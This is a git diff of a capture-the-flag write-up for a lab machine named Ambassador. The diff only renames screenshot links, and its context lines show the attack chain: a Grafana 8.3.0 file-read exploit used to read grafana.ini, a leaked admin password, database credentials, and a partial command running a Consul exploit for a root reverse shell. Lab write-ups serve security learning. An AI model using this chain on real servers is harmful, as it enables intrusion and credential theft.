@@ -21,7 +21,7 @@ PORT     STATE SERVICE
 
 The only interesting thing here is the mentioning of the user `developer`:
 
-![](<../../../.gitbook/assets/image%20(1434).png>)
+![](../../../.gitbook/assets/ambassador-1.png)
 
 Other than that, there was not much here.
 
@@ -29,7 +29,7 @@ Other than that, there was not much here.
 
 Port 3000 was hosting a Grafana instance.
 
-![](<../../../.gitbook/assets/image%20(1458).png>)
+![](../../../.gitbook/assets/ambassador-2.png)
 
 This version of Grafana is vulnerable to public exploits:
 
@@ -45,7 +45,7 @@ Grafana 8.3.0 - Directory Traversal and Arbitrary File Rea | multiple/webapps/50
 
 We can confirm that this works:
 
-![](<../../../.gitbook/assets/image%20(2790).png>)
+![](../../../.gitbook/assets/ambassador-4.png)
 
 Grafana stores a configuration file at `/etc/grafana/grafana.ini`, so let's start there. We can find some passwords within that:
 
@@ -59,15 +59,15 @@ admin_password = messageInABottle685427
 
 With this, we can login to the admin panel:
 
-![](<../../../.gitbook/assets/image%20(3342).png>)
+![](../../../.gitbook/assets/ambassador-7.png)
 
 Within the configuration files, we can find a `mysql.yaml` file.
 
-![](<../../../.gitbook/assets/image%20(878).png>)
+![](../../../.gitbook/assets/ambassador-8.png)
 
 We can't edit it, and there wasn't any credentials in it:
 
-![](<../../../.gitbook/assets/image%20(2887).png>)
+![](../../../.gitbook/assets/ambassador-5.png)
 
 However, maybe we can use the LFI to read this file on the machine itself.
 
@@ -75,7 +75,7 @@ However, maybe we can use the LFI to read this file on the machine itself.
 
 Based on this documentation, it is located in`/etc/grafana/provisioning/datasources`.
 
-![](<../../../.gitbook/assets/image%20(2008).png>)
+![](../../../.gitbook/assets/ambassador-3.png)
 
 Using these creds, we can login to the MySQL database on the machine:
 
@@ -196,4 +196,4 @@ developer@ambassador:~$ python3 exploit_consul.py --rhost 127.0.0.1 --rport 8500
 
 This would give us a reverse shell as `root`.
 
-![](<../../../.gitbook/assets/image%20(3192).png>)
+![](../../../.gitbook/assets/ambassador-6.png)
